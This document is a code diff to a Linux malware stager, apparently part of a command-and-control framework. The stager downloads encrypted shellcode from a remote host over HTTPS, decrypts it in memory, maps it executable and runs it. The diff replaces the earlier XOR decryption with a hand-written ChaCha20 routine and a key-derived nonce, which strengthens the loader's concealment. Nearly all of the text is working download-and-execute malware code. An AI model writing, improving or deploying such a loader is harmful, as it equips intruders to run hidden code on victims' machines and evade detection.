@@ -2,11 +2,13 @@
  * stager_linux.c — productized Linux stager.
  * Placeholders filled at generate time.
  *
- * Flow: HTTPS GET encrypted shellcode → XOR decrypt → mmap RX → jump.
+ * Flow: HTTPS GET ChaCha20-encrypted shellcode → decrypt → mmap RX → jump.
  * Inner payload is the existing linux_agent shellcode (decoder stub + SO).
+ * The ChaCha20 nonce is derived deterministically from the per-payload key.
  */
 #define _GNU_SOURCE
 #include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -27,6 +29,68 @@
 #define STAGER_UA   "@@STAGER_UA@@"
 
 static const unsigned char KEY[] = { @@STAGER_KEY@@ };
+
+/* ---- ChaCha20 (128-bit key variant, 96-bit nonce) ---- */
+
+static uint32_t ch_rotl(uint32_t v, int c) {
+    return (v << c) | (v >> (32 - c));
+}
+
+static void ch_qr(uint32_t *a, uint32_t *b, uint32_t *c, uint32_t *d) {
+    *a += *b; *d ^= *a; *d = ch_rotl(*d, 16);
+    *c += *d; *b ^= *c; *b = ch_rotl(*b, 12);
+    *a += *b; *d ^= *a; *d = ch_rotl(*d, 8);
+    *c += *d; *b ^= *c; *b = ch_rotl(*b, 7);
+}
+
+static uint32_t ch_load32(const unsigned char *p) {
+    return ((uint32_t)p[0]) | ((uint32_t)p[1] << 8) |
+           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
+}
+
+static void ch_block(const unsigned char key[16], const unsigned char nonce[12],
+                     uint32_t counter, uint32_t out[16]) {
+    uint32_t init[16], x[16];
+    init[0] = 0x61707865; init[1] = 0x3320646e;   /* "expand 16-byte k" */
+    init[2] = 0x79622d32; init[3] = 0x6b206574;
+    for (int i = 0; i < 4; i++) {
+        init[4 + i] = ch_load32(key + 4 * i);
+        init[8 + i] = init[4 + i];
+    }
+    init[12] = counter;
+    for (int i = 0; i < 3; i++)
+        init[13 + i] = ch_load32(nonce + 4 * i);
+
+    for (int i = 0; i < 16; i++) x[i] = init[i];
+    for (int r = 0; r < 10; r++) {
+        ch_qr(&x[0], &x[4], &x[8], &x[12]);
+        ch_qr(&x[1], &x[5], &x[9], &x[13]);
+        ch_qr(&x[2], &x[6], &x[10], &x[14]);
+        ch_qr(&x[3], &x[7], &x[11], &x[15]);
+        ch_qr(&x[0], &x[5], &x[10], &x[15]);
+        ch_qr(&x[1], &x[6], &x[11], &x[12]);
+        ch_qr(&x[2], &x[7], &x[8], &x[13]);
+        ch_qr(&x[3], &x[4], &x[9], &x[14]);
+    }
+    for (int i = 0; i < 16; i++) out[i] = x[i] + init[i];
+}
+
+static void ch_decrypt(const unsigned char key[16], const unsigned char nonce[12],
+                       unsigned char *data, size_t len) {
+    uint32_t block[16];
+    uint32_t counter = 0;
+    size_t off = 0;
+    while (off < len) {
+        ch_block(key, nonce, counter, block);
+        const unsigned char *kb = (const unsigned char *)block;
+        size_t n = len - off;
+        if (n > 64) n = 64;
+        for (size_t i = 0; i < n; i++)
+            data[off + i] ^= kb[i];
+        off += n;
+        counter++;
+    }
+}
 
 static int tcp_connect(const char *host, int port) {
     char portstr[16];
@@ -161,7 +225,9 @@ int main(void) {
     close(fd);
     if (total == 0) { free(buf); return 9; }
 
-    for (size_t i = 0; i < total; i++) buf[i] ^= KEY[i % sizeof(KEY)];
+    unsigned char nonce[12];
+    for (int i = 0; i < 12; i++) nonce[i] = KEY[i] ^ 0x5A;
+    ch_decrypt(KEY, nonce, buf, total);
 
     void *mem = mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (mem == MAP_FAILED) { free(buf); return 10; }
